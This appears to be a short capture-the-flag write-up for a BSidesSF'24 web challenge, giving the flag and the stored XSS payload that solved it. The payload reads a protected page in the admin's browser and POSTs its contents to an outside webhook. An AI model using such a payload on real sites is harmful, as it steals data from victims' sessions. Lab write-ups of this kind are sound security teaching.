---
CTF: BSidesSF'24
Category: web
Points: "100"
Date: 2024-05-05
Solved?: true
---
----
[<- Home](../../)
### TL;DR

**Flag**

```
CTF{try-50me-XS5}
```

### Details

Description

> Can you use XSS to steal the flag from the admin?
> 
> Author: itsc0rg1
> 

XSS payload:

```
<script>var x=new XMLHttpRequest();x.open('GET','/xss-one-flag',true);x.onload=function(){var y=new XMLHttpRequest();y.open('POST','<webhook url>',true);y.send('flag='+x.responseText);};x.send();</script>

```

After submitting it, we get the flag

![](assets/Pasted%20image%2020240505232736.png)
